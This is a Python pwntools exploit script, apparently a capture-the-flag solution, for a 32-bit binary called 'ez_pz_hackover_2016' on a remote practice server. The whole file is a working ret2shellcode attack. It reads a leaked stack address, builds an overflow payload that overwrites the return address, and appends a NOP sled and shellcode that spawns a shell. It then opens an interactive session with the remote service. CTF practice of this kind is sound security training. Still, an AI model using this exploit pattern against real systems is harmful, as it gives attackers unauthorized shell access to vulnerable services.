#Made by fly_autumn
#x86 ret2shellcode nop
from pwn import *
#p = process("./ez_pz_hackover_2016")
p = remote("node5.buuoj.cn",29493)
elf = ELF("./ez_pz_hackover_2016")
context(os="linux",arch="i386")

shellcode = asm(shellcraft.sh())
nop_sled = b"\x90" * 100

p.recvuntil(b"0x")
v2_addr = int(p.recv(8),16)
log.success("v2 addr: "+hex(v2_addr))
stack_addr = v2_addr - 0x1c
log.success("stack addr: "+hex(stack_addr))

p.recvuntil(b"> ")
offset = 0x16 + 4
payload1 = b"crashme\x00" + b"A" * (offset - 8) + p32(stack_addr) + nop_sled + bytes(shellcode)
p.sendline(payload1)

p.interactive()
